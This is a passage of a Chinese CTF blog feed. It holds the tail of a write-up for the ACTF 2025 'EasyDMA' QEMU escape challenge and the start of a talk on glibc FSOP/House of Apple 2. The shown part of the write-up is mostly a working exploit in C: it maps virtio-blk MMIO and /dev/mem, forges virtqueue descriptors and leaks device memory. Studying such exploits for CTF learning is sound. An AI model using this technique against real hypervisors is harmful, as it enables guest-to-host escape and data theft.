class="line"><span class="type">uint16_t</span> <span class="title function_">mmio_read16</span><span class="params">(<span class="type">void</span>* addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)addr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">void</span>* addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)addr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read64</span><span class="params">(<span class="type">void</span>* addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)addr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write8</span><span class="params">(<span class="type">void</span>* addr, <span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)addr = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write16</span><span class="params">(<span class="type">void</span>* addr, <span class="type">uint16_t</span> val)</span>{</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)addr = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">void</span>* addr, <span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)addr = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">void</span>* addr, <span class="type">uint64_t</span> val)</span>{</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)addr = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mb</span><span class="params">()</span>{</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">"mfence"</span>:::<span class="string">"memory"</span>)</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_virtio</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/config"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Open virtio config"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> <span class="title">cap</span>;</span></span><br><span class="line">    <span class="type">char</span>* config = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> bytes_read = read(fd, config, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span>(bytes_read &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Read virtio config"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource4"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Open virtio resource4"</span>);</span><br><span class="line">    }</span><br><span class="line">    virtio_mmio = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(virtio_mmio == (<span class="keyword">volatile</span> <span class="type">void</span>*)<span class="number">-1</span>){</span><br><span class="line">        ERR(<span class="string">"mmap virtio mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    u8 cap_ptr = *(u8*)(config+<span class="number">0x34</span>);</span><br><span class="line">    <span class="keyword">while</span>(cap_ptr != <span class="number">0</span>){</span><br><span class="line">        <span class="keyword">if</span>(config[cap_ptr] != <span class="number">0x9</span>){</span><br><span class="line">            cap_ptr = *(u8*)(config+cap_ptr+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;cap, config+cap_ptr, <span class="keyword">sizeof</span>(cap));</span><br><span class="line">        print_cap(&amp;cap);</span><br><span class="line">        <span class="keyword">switch</span>(cap.cfg_type){</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_COMMON_CFG:</span><br><span class="line">                virtio_common_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_NOTIFY_CFG:</span><br><span class="line">                virtio_notify_mmio = (<span class="keyword">struct</span> virtio_notify_cfg*)((<span class="type">size_t</span>)virtio_mmio + cap.offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_ISR_CFG:</span><br><span class="line">                virtio_isr_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_DEVICE_CFG:</span><br><span class="line">                virtio_device_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        cap_ptr = cap.cap_next;</span><br><span class="line">    }</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">free</span>(config);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_common_cfg</span>* <span class="title">common_cfg</span> =</span> (<span class="keyword">struct</span> virtio_pci_common_cfg*)virtio_common_mmio;</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;device_feature_select, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"device_feature[0]: %x\n"</span>, mmio_read32(&amp;common_cfg-&gt;device_feature));</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;device_feature_select, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"device_feature[1]: %x\n"</span>, mmio_read32(&amp;common_cfg-&gt;device_feature));</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"driver_feature[0]: %x\n"</span>, mmio_read32(&amp;common_cfg-&gt;driver_feature));</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"driver_feature[1]: %x\n"</span>, mmio_read32(&amp;common_cfg-&gt;driver_feature));</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_config</span>* <span class="title">blk_cfg</span> =</span> (<span class="keyword">struct</span> virtio_blk_config*)virtio_device_mmio;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"capacity: %lx\n"</span>, mmio_read64(&amp;blk_cfg-&gt;capacity));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size_max: %x\n"</span>, mmio_read32(&amp;blk_cfg-&gt;size_max));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"seg_max: %x\n"</span>, mmio_read32(&amp;blk_cfg-&gt;seg_max));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"geometry.cylinders: %x\n"</span>, mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"geometry.heads: %x\n"</span>, mmio_read8(&amp;blk_cfg-&gt;geometry.heads));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"geometry.sectors: %x\n"</span>, mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"blk_size: %x\n"</span>, mmio_read32(&amp;blk_cfg-&gt;blk_size));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reset device</span></span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, <span class="number">0</span>);</span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);</span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, <span class="number">0</span>);</span><br><span class="line">    mmio_write32(&amp;common_cfg-&gt;driver_feature, <span class="number">0</span>); <span class="comment">// disable all features</span></span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);</span><br><span class="line">    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// alloc dma memory</span></span><br><span class="line">    <span class="type">int</span> dma_fd = open(<span class="string">"/dev/mem"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(dma_fd &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Open dma"</span>);</span><br><span class="line">    }</span><br><span class="line">    dma_mem = mmap((<span class="type">void</span>*)<span class="number">0x3ffdd000</span>, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, <span class="number">0x3ffdd000</span>);</span><br><span class="line">    <span class="keyword">if</span>(dma_mem == (<span class="keyword">volatile</span> <span class="type">void</span>*)<span class="number">-1</span>){</span><br><span class="line">        ERR(<span class="string">"mmap dma mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)dma_mem = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)dma_mem);</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)dma_mem = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"dma_mem: %p\n"</span>, dma_mem);</span><br><span class="line">    dma_data = dma_mem + <span class="number">0x1000</span>;</span><br><span class="line">    queue_desc = (<span class="keyword">struct</span> virtq_desc*)dma_mem;</span><br><span class="line">    queue_avail = (<span class="keyword">struct</span> virtq_avail*)((<span class="type">char</span>*)queue_desc + <span class="number">0x10</span> * VIRTIO_QUEUE_SIZE);</span><br><span class="line">    queue_used = (<span class="keyword">struct</span> virtq_used*)((<span class="type">char</span>*)dma_mem + <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// init queue</span></span><br><span class="line">    mmio_write16(&amp;common_cfg-&gt;queue_select, <span class="number">0</span>);</span><br><span class="line">    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);</span><br><span class="line">    mmio_write64(&amp;common_cfg-&gt;queue_desc, (<span class="type">size_t</span>)<span class="number">0x3ffdd000</span>);</span><br><span class="line">    mmio_write64(&amp;common_cfg-&gt;queue_driver, (<span class="type">size_t</span>)<span class="number">0x3ffdd100</span>);</span><br><span class="line">    mmio_write64(&amp;common_cfg-&gt;queue_device, (<span class="type">size_t</span>)<span class="number">0x3ffdd200</span>);</span><br><span class="line">    mmio_write16(&amp;common_cfg-&gt;queue_enable, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"virtio init done"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray</span><span class="params">()</span>{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0xfff</span>; i &gt; <span class="number">0x28</span>; i-=<span class="number">4</span>){</span><br><span class="line">        mmio_write32((<span class="type">void</span>*)readflag_mmio, i);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">void</span>* addr, <span class="type">size_t</span> size)</span>{</span><br><span class="line">    <span class="comment">// dump 4 bytes per time</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i+=<span class="number">4</span>){</span><br><span class="line">        <span class="type">uint32_t</span> val = *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(addr+i);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++){</span><br><span class="line">            <span class="type">uint8_t</span> chr = (val &gt;&gt; (j*<span class="number">8</span>)) &amp; <span class="number">0xff</span>;</span><br><span class="line">            <span class="keyword">if</span>(chr &gt;= <span class="number">0x20</span> &amp;&amp; chr &lt;= <span class="number">0x7e</span>){</span><br><span class="line">                <span class="built_in">putchar</span>(chr);</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                <span class="built_in">putchar</span>(<span class="string">'?'</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    init_readflag();</span><br><span class="line">    init_virtio();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_req</span>* <span class="title">req</span> =</span> (<span class="keyword">struct</span> virtio_blk_req*)dma_data;</span><br><span class="line">    req-&gt;type = <span class="number">0xffffffffu</span>;</span><br><span class="line">    req-&gt;sector = <span class="number">0</span>;</span><br><span class="line">    req-&gt;reserved = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    queue_desc[<span class="number">0</span>].addr = (<span class="type">size_t</span>)req;</span><br><span class="line">    queue_desc[<span class="number">0</span>].len = <span class="number">0x10</span>;</span><br><span class="line">    queue_desc[<span class="number">0</span>].flags = VIRTQ_DESC_F_NEXT;</span><br><span class="line">    queue_desc[<span class="number">0</span>].next = <span class="number">1</span>;</span><br><span class="line">    queue_desc[<span class="number">1</span>].addr = (<span class="type">size_t</span>)<span class="number">0xfe000000</span>;</span><br><span class="line">    queue_desc[<span class="number">1</span>].len = <span class="number">0xfff</span>;</span><br><span class="line">    queue_desc[<span class="number">1</span>].flags = VIRTQ_DESC_F_WRITE | VIRTQ_DESC_F_NEXT;</span><br><span class="line">    queue_desc[<span class="number">1</span>].next = <span class="number">2</span>;</span><br><span class="line">    queue_desc[<span class="number">2</span>].addr = (<span class="type">size_t</span>)dma_data + <span class="number">0xa00</span>;</span><br><span class="line">    queue_desc[<span class="number">2</span>].len = <span class="number">1</span>;</span><br><span class="line">    queue_desc[<span class="number">2</span>].flags = VIRTQ_DESC_F_WRITE;</span><br><span class="line">    queue_desc[<span class="number">2</span>].next = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    queue_avail-&gt;flags = <span class="number">1</span>;</span><br><span class="line">    queue_avail-&gt;ring[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    queue_avail-&gt;idx = <span class="number">1</span>;</span><br><span class="line">    mb();</span><br><span class="line">    mmio_write8((<span class="type">void</span>*)virtio_isr_mmio, <span class="number">1</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_common_cfg</span>* <span class="title">common_cfg</span> =</span> (<span class="keyword">struct</span> virtio_pci_common_cfg*)virtio_common_mmio;</span><br><span class="line">    <span class="type">void</span>* notify_addr = (<span class="type">void</span>*)((<span class="type">uintptr_t</span>)virtio_notify_mmio + mmio_read32((<span class="type">void</span>*)&amp;virtio_notify_mmio-&gt;cap.offset) + mmio_read16(&amp;common_cfg-&gt;queue_notify_off) * mmio_read32((<span class="type">void</span>*)&amp;virtio_notify_mmio-&gt;notify_off_multiplier));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i+=<span class="number">4</span>){</span><br><span class="line">        spray();</span><br><span class="line">    }</span><br><span class="line">    mmio_write16(notify_addr, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">    hexdump((<span class="type">char</span>*)virtio_common_mmio + <span class="number">0x000</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    munmap(dma_mem, <span class="number">0x3000</span>);</span><br><span class="line">    munmap(virtio_mmio, <span class="number">0x4000</span>);</span><br><span class="line">    munmap(readflag_mmio, <span class="number">0x1000</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="references">References</h1><section id="footnotes" class="footnotes footnotes-end-of-document" role="doc-endnotes"><hr><ol><li id="fn1"><p><a href="https://docs.oasis-open.org/virtio/virtio/v1.1/csprd01/virtio-v1.1-csprd01.html#x1-230005">VirtualI/O Device (VIRTIO) Version 1.1</a><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2"><p><a href="https://www.redhat.com/en/blog/virtqueues-and-virtio-ring-how-data-travels">Virtqueuesand virtio ring: How the data travels</a><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn3"><p><a href="https://en.wikipedia.org/wiki/Memory-mapped_I/O_and_port-mapped_I/O">Memory-mappedI/O and port-mapped I/O</a><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;easydma&quot;&gt;EasyDMA&lt;/h1&gt;
&lt;p&gt;From: ACTF 2025&lt;/p&gt;
&lt;p&gt;题目给出一个去符号的 qemu 二进制文件
&lt;code&gt;qemu-system-x86_64&lt;/code&gt;，启动参数如下&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;timeout&lt;/span&gt; --foreground 300 ./qemu-system-x86_64 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -L pc-bios &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -m 1024 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -kernel bzImage &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -initrd rootfs.cpio &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -drive file=null-co://,&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;=none,&lt;span class=&quot;built_in&quot;&gt;id&lt;/span&gt;=mydisk &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -device virtio-blk-pci,drive=mydisk,ioeventfd=off &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -device readflag &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -append &lt;span class=&quot;string&quot;&gt;&quot;priority=low console=ttyS0&quot;&lt;/span&gt; &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -monitor /dev/null &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -nographic&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://summ2.link/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://summ2.link/tags/pwn/"/>
    
    <category term="qemu" scheme="http://summ2.link/tags/qemu/"/>
    
    <category term="virtio" scheme="http://summ2.link/tags/virtio/"/>
    
    <category term="dma" scheme="http://summ2.link/tags/dma/"/>
    
  </entry>
  
  <entry>
    <title>Vidar 分享会 - FSOP</title>
    <link href="http://summ2.link/categories/CTF/vidarshare-fsop/"/>
    <id>http://summ2.link/categories/CTF/vidarshare-fsop/</id>
    <published>2025-03-31T16:00:00.000Z</published>
    <updated>2025-05-08T04:13:39.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="i.-fsop">I. FSOP</h1><blockquote><p>FSOP 是 File Stream Oriented Programming 的缩写。</p><p>FSOP 的核心思想就是劫持<code>_IO_list_all</code> 的值来伪造链表和其中的<code>_IO_FILE</code> 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用<code>_IO_flush_all_lockp</code>，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个FILE 调用fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>。<span id="more"></span></p></blockquote><h1 id="ii.-rtfsc">II. RTFSC</h1><p>下面我将以 glibc-2.39 源码为例，分析 FSOP 的一个实际应用 ---House ofApple (2)<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a> 涉及的原理。</p><h2 id="io_file">_IO_FILE</h2><p><code>/libio/bits/types/struct_FILE.h</code> 中有如下定义：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>使用 gdb，可以得到其成员的相对偏移：</p><figure><img src="\glibcFSOP/Screenshot_20250331_190446.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><h2 id="exit-调用过程">Exit () 调用过程</h2><h3 id="run_exit_handlers">__run_exit_handlers()</h3><p><code>exit()</code> 在 <code>/stdlib/exit.c</code> 有定义:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 